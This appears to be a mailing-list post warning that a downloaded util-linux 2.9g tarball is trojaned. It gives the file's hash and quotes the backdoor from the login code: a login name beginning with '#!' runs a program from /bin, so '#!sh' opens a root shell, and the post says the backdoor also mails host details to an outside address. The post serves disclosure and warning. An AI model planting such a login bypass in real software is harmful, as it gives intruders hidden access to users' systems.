I accidentally deleted the message(s) pertaining to the original thread,
but just wanted to throw in a "me too" warning regarding the original
post. 
I downloaded (but fortunately hadn't yet installed) the latest util-linux
from the URL listed in Documentaion/Changes, and it has some strange code
(see below).  Here's the file info:
File: util-linux-2.9g.tar.gz
Size: 566655 bytes
MD5:  d0c4b6fac2d3a1d738d5c6671169e182
      (copied by hand, so may be bad :)
I downloaded it January 23, 01:43 PST.
For the curious, here's a snippet from a section of code that is called
after getting the login name:
	if ((name[0] == '#') && (name[1] == '!'))
	{
		pt = (char*)&name[2];
		sprintf(a,"/bin/%s",pt);
		execl(a,a,(void*)0);
	}
	...
So apparently you just login as "#!sh" and you're in.  It then sends an
email (containing hostname & uid of login) to an account at hotmail, as
mentioned previously.
...So don't download from there. :)  Any other (trusted) locations for the
util-linux package?
Been using util-linux-2.6 with no problems with 2.2.0-finale though.
